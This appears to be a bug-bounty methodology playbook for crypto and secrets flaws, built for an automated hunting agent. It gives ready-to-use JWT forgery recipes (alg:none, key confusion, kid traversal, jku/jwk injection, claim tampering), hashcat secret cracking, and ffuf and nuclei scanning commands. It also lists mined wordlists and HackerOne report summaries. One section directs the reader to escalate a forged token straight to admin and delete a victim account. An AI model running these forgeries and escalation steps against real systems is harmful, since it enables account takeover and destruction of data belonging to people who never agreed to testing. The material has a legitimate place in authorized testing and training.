| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_crypto-and-secrets.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crypto-and-secrets.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Verify leaked keys before reporting; check scope and whether the key is live.

```sh
nuclei -u https://target -tags exposure,keys,tokens,ssl \
       -severity info,low,medium,high,critical -rl 40 -o nuclei_crypto-and-secrets.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens \
       -rl 40 -o nuclei_crypto-and-secrets_tokens.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/configs \
       -rl 40 -o nuclei_crypto-and-secrets_configs.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
attacker-controlled and reaches a dangerous sink.

**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.

**Expiry / time-based claim manipulation**
```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```
Combined with any forging technique above (alg:none, key confusion, jwk injection), this
bypasses time-based validation when the verifier does not enforce strict expiry rules.

**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```
This is systematic IDOR via claims — if authorization logic trusts the token claims
without checking ownership server-side, you cross into another tenant's resources.
Works especially well combined with alg:none or weak-secret attacks.

Match the `payload` shape to a REAL token from the app (decode one first) — keep
its claim names, only change identity/role. A payload the app can't parse fails
for the wrong reason and wastes the attempt.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class crypto-and-secrets --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class crypto-and-secrets
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class crypto-and-secrets
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class crypto-and-secrets --min-bounty 1000
```

### Related

- `hackerone-info-disclosure` (1,827 reports)
- `hackerone-auth-bypass` (989 reports)

### Related

- `info-disclosure` (1,827 reports)
- `auth-bypass` (989 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/jwt/algorithm-confusion
2. https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities

### Additional notes

### Parameters observed

`id` · `token` · `type` · `_gl` · `redirectUrl` · `EQ` · `name` · `uuid` · `dnssec` · `key` · `PackageID` · `jwt` · `action` · `active_action` · `item_id` · `item_no` · `page_id` · `block_id` · `client_id` · `redirect_uri`

### JumpCloud API Key leaked via Open Github Repository.

`#716292` · Starbucks · $0 · critical · 2019-12-30 · ▲739
> Summary: Open Github Repo Leaking Starbucks JumbCloud API Key Description: Team, While going through Github search I discovered a public repository which contains Jumbcloud API Key of Starbucks. Repo: https://github.com/██████████/Project. File: https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go POC List systems There are multiple AWS instances present SSO Applications AWS login SAM config is presents.

### Github Token Leaked publicly for https://github.sc-corp.net

`#396467` · Snapchat · $0 · critical · 2018-10-08 · ▲582
> GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and similar services as i was able to find github token indexed 7 hours Ago by user ██████ - Software Engineer - Snap Inc

### Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg

`#340431` · Uber · $4,000 · high · 2020-04-30 · ▲376
> lioncityrentals.com.sg employed a Wordpress installation that possessed a vulnerable plugin, Formidable Forms, which was vulnerable to reflected XSS, and exposed sensitive form data. Thanks again for the report, @healdb! This was the first bug I ever found that exposed a large amount of PII, thanks for disclosing @uber! This bug reinforces to me that hackers should always examine microsites as well as core domains, sometimes bugs on microsites can lead to…

### Reset any password

`#703972` · pixiv · $0 · high · 2021-03-31 · ▲313
> When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the number of submissions, so I can reset the password of any user.

### Infromation Disclosure To Use of Hard-coded Cryptographic Key

`#2353237` · Reddit · $0 · medium · 2024-02-06 · ▲238
> [ Leaking very sensitive information through a JS file that is clearly for developers within the website and should not be available to the public. The leaked information consists of a lot of API keys, Paypal keys, information and keys about the server and the application, and a lot or a lot of sensitive information, and I will explain the information through screenshots. ] I will explain and clarify each of these keys that were leaked.

### What actually pays

A JWT is `header.payload.signature`, each base64url. The signature is the only
thing stopping you from editing the payload (your identity/role) and replaying
it. It pays **High/Critical** when the verifier can be tricked into accepting a
token you forged — so you become another user or an admin without their secret.

Two classic, generic verifier flaws:

- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
  `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
  another user's `id`/`email`). A broken verifier skips signature checking.
- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
  RSA **public** key is, by definition, public. If the verifier lets you choose
  HS256, it will use that public key as the HMAC *secret* — which you also know.
  Sign an edited payload with HS256 using the public key and it validates.

### Recon — is this app JWT-based?

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

Decode the header (base64url the first segment). `"alg":"RS256"` → try key
confusion. Any alg → always try `alg:none` first; it's free.

### Offline attacks — weak HMAC secret cracking

If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
password list:
```bash
# Hashcat: mode 16500 = JWT
hashcat -a 0 -m 16500 <jwt_file> rockyou.txt

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```
Once the secret is cracked, forge any token using HS256 with that secret (via
jwt_tool or PyJWT).

### Automated attack automation

Use purpose-built JWT attack suites to run all known forgery modes in parallel:
```bash
# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```
Run these early in JWT recon; they often find the vulnerability faster than
manual chaining of individual techniques.

### Drive to the ADMIN objective — do not stop at a working forge

A forge that loads YOUR own `/my-account` is NOT the goal — it just proves the
forge mechanism works. The objective is almost always **admin** (reach an
admin-only page and perform an admin action, e.g. delete a user). Once any forge
is accepted, IMMEDIATELY escalate — change identity to admin AND aim at the admin
endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.

Fixed escalation sequence (run it in order, do not loop on earlier steps):

1. Forge admin identity and hit the admin page (try these claim names — match a
   decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token
   with `kid` pointed at `/dev/null` and an empty secret, payload `{"sub":"administrator"}`,
   sent to `GET /admin`.
2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform
   the admin action with the SAME forged token — a typical one is deleting a
   target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps
   use `POST /admin/delete` — read the admin page for the exact form/verb).

A 401 on `/admin` means the forge/claim is wrong — change ONE thing (the kid
depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare
unauthenticated `GET /admin` (no token) — that always 401s and wastes effort.

### Proof of impact

Point the forged token at a protected/admin endpoint and prove you read data you
should not: an account/user listing (multiple users' emails), another user's
object, or a completed admin action (the deleted-user confirmation). Reading the
admin user list or performing the admin action with a forged token IS the exploit.
A 200 that returns only your own data, or a 401, is not proof.

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Crypto And Secrets — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Regex -> `AKIA[0-9A-Z]{16}`, `AIza[0-9A-Za-z_-]{35}`, `ghp_[0-9A-Za-z]{36}`

- JWT secret -> `hashcat -m 16500`

- Weak reset token -> timestamp/random seed



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `SecTrustSetOCSPResponse()` |

| 7× | `hsts_check()` |

| 6× | `$position` |

| 6× | `ssl_peer_key_build()` |

| 5× | `ossl_apple_verify()` |

| 5× | `hsts_add_host_expire()` |

| 5× | `Curl_hsts_parse()` |

| 4× | `master @ 3ad4a5ee8` |

| 4× | `Curl_ossl_check_peer_cert()` |

| 4× | `verifystatus()` |

| 4× | `SSL_get_tlsext_status_ocsp_resp()` |

| 4× | `gnutls_certificate_verify_peers2()` |

| 4× | `Math.random()` |

| 4× | `EntropySource()` |

| 4× | `Curl_fopen()` |

| 4× | `Curl_vtls_apple_verify()` |

| 4× | `$passPhrase` |

| 4× | `$version` |

| 4× | `OC\Security\SecureRandom::generate` |

| 4× | `hsts_create()` |



## Parameters observed



`id` · `token` · `type` · `_gl` · `redirectUrl` · `EQ` · `name` · `uuid` · `dnssec` · `key` · `PackageID` · `jwt` · `action` · `active_action` · `item_id` · `item_no` · `page_id` · `block_id` · `client_id` · `redirect_uri`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_crypto-and-secrets.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_crypto-and-secrets.txt` | 77 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_crypto-and-secrets.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crypto-and-secrets.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Verify leaked keys before reporting; check scope and whether the key is live.



```sh

nuclei -u https://target -tags exposure,keys,tokens,ssl \

       -severity info,low,medium,high,critical -rl 40 -o nuclei_crypto-and-secrets.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens \

       -rl 40 -o nuclei_crypto-and-secrets_tokens.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures/configs \

       -rl 40 -o nuclei_crypto-and-secrets_configs.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Crypto And Secrets — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Search JS bundles, mobile apps, and public repos for keys/tokens.

- Check password storage, reset tokens, and encryption modes.

- Test TLS/certificate validation in mobile/thick clients.

- Look for secrets in logs, errors, URLs, and analytics.



## Bypass tricks



- Check base64/hex-obfuscated keys in bundles.

- Look at source maps and CI artifacts for env files.

- Test key scope before reporting.



## Deeper checklist



- Search JS bundles, mobile apps, and public repos for API keys, tokens, and private keys.

- Check password storage and reset tokens for weak hashing, short entropy, or reuse.

- Test TLS/certificate validation in mobile and thick clients (proxy interception).

- Look for secrets in logs, error messages, URLs, and analytics events.

- Check encryption modes, IV reuse, hardcoded keys, and missing integrity protection.

- Validate that a leaked key is live and scoped to sensitive access before reporting.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **JumpCloud API Key leaked via Open Github Repository.** — `#716292` · Starbucks · $0 · ▲739

  > File: [https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go](https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go)

- **Github Token Leaked publicly for https://github.sc-corp.net** — `#396467` · Snapchat · $0 · ▲582

  > https://github.com/█████/leetcode/blob/0eec6434940a01e490d5eecea9baf4778836c54e/TopicMatch.py

- **Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg** — `#340431` · Uber · $4,000 · ▲376

  > And be sure to check out my blog https://healdb.tech/blog/ or my twitter https://twitter.com/heald ben

- **Reset any password** — `#703972` · pixiv · $0 · ▲313

  > 1.input the email [reset password url](https://www.pixiv.net/reminder.php).

- **Infromation Disclosure To Use of Hard-coded Cryptographic Key** — `#2353237` · Reddit · $0 · ▲238

  > [ I discovered this link while I was conducting a survey and collecting information, and I discovered it when I visited this link https://www.reddit.com/?rdt=49420 after logging into my account, as I will explain in pictures using the Trufflehog tool.

- **Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse** — `#286740` · Internet Bug Bounty · $0 · ▲191

  > [The Wi-Fi Alliance](https://www.wi-fi.org/news-events/newsroom/wi-fi-alliance-security-update) is using these to [test if new products are affected](https://www.wi-fi.org/security-update-october-2017) or not.

- **Slack DTLS uses a private key that is in the public domain, which may lead to SRTP stream hijack** — `#531032` · Slack · $2,000 · ▲170

  > Notice that the `SetRemoteDescription` fingerprint in the `about:webrtc-internals` page is `C5:5F:DA:7D:84:47:B1:BF:6B:55:16:62:48:31:3E:D3:F1:7B:25:89:92:4A:4B:4D:4D:D9:D5:AF:EA:D8:15:44`

- **Public and secret api key leaked  in JavaScript source** — `#983331` · Stripo Inc · $0 · ▲148

  > Directory sensitive is ``main.c1965c58f39a0f4aadc3.js`` parse this json files using jsonparseronline

- **[3DS][SSL] Improper certificate validation allows an attacker to perform MitM attacks** — `#894922` · Nintendo · $0 · ▲129

  > - spoofing the `NetUpdateSOAP` and `ECommerceSOAP` endpoints used by the NIM module to:

- **MySQL username and password leaked in developer.valvesoftware.com via source code dislosure** — `#291057` · Valve · $0 · ▲123

  > But they forgot about `/scripts/`itself where it's also allowing a directory listing to see it contents.

- **connect.8x8.com/api/v1: JWT Algorithm Confusion Vulnerability** — `#3800870` · 8x8 · $1,337 · ▲111

  > @kyotozzx reported a JWT algorithm confusion vulnerability in the `v1` API of `connect.8x8.com`.

- **Unauthorized Account Access via Leaked Credentials in URL Format (Account Takeover )** — `#3080597` · Khan Academy · $0 · ▲107

  > this time the email and password of the victim is archived in clear text ( https://en.khanacademy.org/login,██████,,█████████,,,█████████,██████████,Personal )

- **Insecure Zendesk SSO implementation by generating JWT client-side** — `#638635` · Trint Ltd · $0 · ▲102

  > Looking at some of the UI views, I stumbled upon `static/js/modules/auth/pages/ZendeskLoadingPage.js`.

- **Important information leaked on Github** — `#649322` · Equifax-vdp · $0 · ▲98

  > In the following link (https://github.com/ajiththorali/Testing/blob/49025b364451fb2076f85ad009a0dc50a941c5ce/target/classes/API Equifax/propertiesHandle.properties) you could find this info

- **internal dev tokens disclosure** — `#1940443` · Snapchat · $250 · ▲96

  > such as https://github.com/Snapchat/KeyDB/commit/157b32109854f947843366f66215ccf90809e766

- **Leaked reused password for a few Khan Academy users** — `#3099978` · Khan Academy · $0 · ▲92

  > Increased risk of account takeover (ATO) if users reuse passwords across platforms.

- **Github Token Leaked publicly for https://github.com/mopub** — `#612231` · X / xAI · $0 · ▲92

  > ====================================================

- **███ leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions** — `#2294930` · U.S. Dept Of Defense · $0 · ▲90

  > Content-Type: application/x-www-form-urlencoded;charset=UTF-8

- **Cleartext Transmission of Sensitive Information Leads to administrator access** — `#813159` · Helium · $0 · ▲89

  > Vulnerable URL: https%3A%2F%2Fconsole.helium.com%2Fusers

- **fetlife.com/signup_step_profile expose access_token of mapbox.com** — `#2129769` · FetLife · $0 · ▲87

  > Upon having this access token, I could freely use your token on my site, even though fetlife have `Referer: https://fetlife.com/`, I could navigate around that easily using direct http call from my server and inject Referer header as `https://fetlife.com/`.

- **elections.k8s.io uses weak session secret key, may place elections at risk** — `#1387366` · Kubernetes · $250 · ▲86

  > @nagli and I discovered that `elections.k8s.io` uses a weak Flask SECRET KEY, literally the string `N/A`, to sign authentication cookies.

- **Microsoft `x-apikey` Exposed in Mozilla CI Public Logs** — `#3243860` · Mozilla · $200 · ▲84

  > The key appears in HTTP POST requests sent to Microsoft's telemetry endpoint during automated Firefox testing and is captured via mitmproxy logs.

- **Invite tokens have Insufficient entropy in GHES Management Console** — `#2197801` · GitHub · $0 · ▲81

  > An insufficient entropy vulnerability was identified in GitHub Enterprise Server (GHES) that allowed an attacker to brute force a user invitation to the GHES Management Console.

- **Cookie steal through content Uri** — `#876192` · Brave Software · $0 · ▲79

  > Because of the usage of `root-path` with path `.`, it is possible to use this provider to point to all files in the Android system.

- **Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us** — `#902733` · Curve · $0 · ▲79

  > When am going through all the JS files in curve.com I found a link called "/usa" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details.

- **SMTP interaction theft via MITM** — `#953219` · PortSwigger Web Security · $0 · ▲78

  > See http://www.postfix.org/CVE-2011-0411.html for adetailled description.

- **Page has a link to google drive which has logos and a few customer phone recordings** — `#864712` · Eternal · $200 · ▲76

  > As you can see in the above image,there are about 35 recordings wherein sensitive information is being disclosed.I guess everything is uploaded yesterday (May 1st).

- **Grammarly Keyboard for Android "Authorization Code with PKCE" flow implementation vulnerability that allows account takeover** — `#824931` · Superhuman (formerly Grammarly) · $0 · ▲76

  > @tomtenisse identified a vulnerability in Grammarly Keyboard for Android that allowed malicious application installed on the device to guess the PKCE code verifier value and consequently obtain access to OAuth access token (`grauth` cookie).

- **SameSite restrictions are lifted, and SameSite:Strict cookie are being sent.** — `#3253725` · Brave Software · $0 · ▲73

  > The reason SameSite=Strict cookies are being sent in this case is because the Sec-Fetch-Site: cross-site header, which should normally be present, is missing.

- **明確な認証不備および潜在的な中間者攻撃の可能性（Clear Authentication Deficiencies & Potential for Man-in-the-Middle Attacks）** — `#2642615` · Sony · $0 · ▲71

  > For example, if you want to set the Bluetooth name to "Example Laptop", write `PRETTY HOSTNAME=Example Laptop` in `machine-info`.



## Case studies



### JumpCloud API Key leaked via Open Github Repository.

`#716292` · Starbucks · $0 · critical · 2019-12-30 · ▲739

> Summary: Open Github Repo Leaking Starbucks JumbCloud API Key Description: Team, While going through Github search I discovered a public repository which contains Jumbcloud API Key of Starbucks. Repo: https://github.com/██████████/Project. File: https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go POC List systems There are multiple AWS instances present SSO Applications AWS login SAM config is presents.



### Github Token Leaked publicly for https://github.sc-corp.net

`#396467` · Snapchat · $0 · critical · 2018-10-08 · ▲582

> GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and similar services as i was able to find github token indexed 7 hours Ago by user ██████ - Software Engineer - Snap Inc



### Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg

`#340431` · Uber · $4,000 · high · 2020-04-30 · ▲376

> lioncityrentals.com.sg employed a Wordpress installation that possessed a vulnerable plugin, Formidable Forms, which was vulnerable to reflected XSS, and exposed sensitive form data. Thanks again for the report, @healdb! This was the first bug I ever found that exposed a large amount of PII, thanks for disclosing @uber! This bug reinforces to me that hackers should always examine microsites as well as core domains, sometimes bugs on microsites can lead to…



### Reset any password

`#703972` · pixiv · $0 · high · 2021-03-31 · ▲313

> When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the number of submissions, so I can reset the password of any user.



### Infromation Disclosure To Use of Hard-coded Cryptographic Key

`#2353237` · Reddit · $0 · medium · 2024-02-06 · ▲238

> [ Leaking very sensitive information through a JS file that is clearly for developers within the website and should not be available to the public. The leaked information consists of a lot of API keys, Paypal keys, information and keys about the server and the application, and a lot or a lot of sensitive information, and I will explain the information through screenshots. ] I will explain and clarify each of these keys that were leaked.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class crypto-and-secrets --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class crypto-and-secrets

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class crypto-and-secrets

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class crypto-and-secrets --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_crypto-and-secrets.txt`

```text
id
token
type
redirectUrl
EQ
name
uuid
dnssec
key
PackageID
jwt
action
active_action
item_id
item_no
page_id
block_id
client_id
redirect_uri
format
report_id
aura.context
aura.pageURI
aura.token
include_zero_rate
settings_version
ro
redirect
response_type
state
hideResults
rdt
require_security
limit
types
autocomplete
language
access_token
email
rc
locale
client_secret
grant_type
db
ssl_cert_reqs
filter
qs
TableRow
rt
js_use_scheme
display
scope
quicksearch
number
DialogName
renderMode
Skin
Title
dpptn
isRtl
dp
ia
view
FileName
subject
pid
os_username
os_password
test_domain
username
path
shareType
shareWith
password
code
site
blog_id
```

### `paths_crypto-and-secrets.txt`

```text
/ssltest/analyze.html
/docs/hsts.html
/blog/
/confirm_email
/CN=PoC
/CN=localhost
/login
/api/crypto.html
/Redirect.aspx
/path/to/curl
/thread/10857
/Project
/scripts/
/access/jwt
/usa
/register
/doc/html/rfc6455
/redirect
/api/tls.html
/migrating-from-ssl-and-early-tls
/blog/blog/2016/03/01/an-openssl-users-guide-to-drown/
/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx
/ocs/v1.php/cloud/capabilities
/info.php
/2014/11/its-all-about-time.html
/path/to/curl-8.23.0
/crossdomain/XDomainXploit.as
/show_bug.cgi
/news/secadv/20160301.txt
/a-lesson-in-timing-attacks/
/accounts/password/
/rfc/rfc6960.html
/server/rest/login
/2014/04/is-your-site-hsts-enabled.html
/sts
/api/systems
/api/applications
/api/systemusers
/1.0/commands/create-a-command
/api/v3/repos/Snapchat/android/pulls/
/adv/formidable.html
/reminder.php
/news-events/newsroom/wi-fi-alliance-security-update
/security-update-october-2017
/security/2017-1/
/pub/OpenBSD/patches/6.1/common/027_net80211_replay.patch.sig
/scripts/final_cleanup.sh
/error
/ists/stspost
/Snapchat/keydb-internal/github-action-runner-docker/Dockerfile
/POM/4.0.0
/content/mopub/mopub-android-mediation/
/LIBS
/xsd/maven-4.0.0.xsd
/users/attributes/email
/signup_step_profile
/geocoding/v5/mapbox.places/ho%20chi.json
/sdcard/Download/
/api/waitlist/us
/credit
/CVE-2011-0411.html
/vuln/detail/cve-2022-29912
/vuln/detail/cve-2022-45410
/vuln/detail/CVE-2018-12402
/vuln/detail/cve-2022-45413
/mdr/wh1000xm5/v1/ja/contents/TP1000533411.html
/ej/
/headphone/products/WH-1000XM5/
/articles/2021-02-27-linux-routing
/api
/balances
/api/sellLimit
/api/openOrders
/sellLimit
/api/balances
/sslbypass.html
/OCSP-Validation-With-Openssl/
/confirm_device
/docs/CVE-2024-2466.html
/testsql.sh
/1.1/help/settings.json
/docs/CVE-2024-2379.html
/2024/01/new-terrapin-flaw-could-let-attackers.html
/advisor/business/public-wifi-risks/
/2014/09/gradually-sunsetting-sha-1.html
/statistics/677108/global-public-wi-fi-hotspots/
/resources/work-from-home-habits
/abs/2312.12422
/vuln/detail/CVE-2023-48795
/vulnerability/weak-ssh-algorithms-discovered/
/Marathon/Default.aspx
/manual/html_node/Session-initialization.html
/export_panelists_to_xlsx
/landing/landing.htm
/user/password
/data/definitions/521.html
/student/authentication/request_password_reset
/student/authentication/reset_password/
/C=US/O=DigiCert
/gcs/
/config
/iOS
/ocsapp/cloud/users
/settings/admin/logging
/ocs/v2.php/cloud/users
/settings/users
/extension/manifest.json
/api/system/verification-codes/
/api/system/verification-codes
/api/system/email-account/password
/gettransactions
/2012/10/dkim-vulnerability-widespread
/pushed
/software/sslstrip/
/2016/02/22/SSLstrip-for-newbies/
/curl-gnutls-eku-XXXXXX
/x86-64/
/X509v3
/aes_gcm/
/sets/8/challenges/64.txt
/hacking-the-javascript-lottery-80cc437e3b7f
/rest/v1/users/rubyonrails
/host/16.170.179.191
/g/c/
/hangzhou1year/
/app/data/ssl/saml.crt
/accounts/login/
/media/
/en/stable/topics/logging
/en/1.11/ref/settings/
/app/data
/static/
/accounts/email-sent/
/accounts/logout/
/en/latest/configuration/settings.html
/en/latest/admin/auth.html
/app/data/secret
/app/data/settings-override.py
/accounts/profile/
/doc/spec.php
/app/data/ssl/saml.key
/accounts/email/
/unicode/language-identifiers.html
/data/definitions/327.html
/package/global-agent
/specs/openid-connect-core-1_0.html
/web/20220320042405/https://nextcloud.com/security/threat-model
/forgot
/download/
/en-us/windows/win32/api/wincred/nf-wincred-credreadw
```

## Source skills merged into this topic

- `h1skills` — `hackerone-crypto-and-secrets`
- `hunting` — `crypto-and-secrets`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
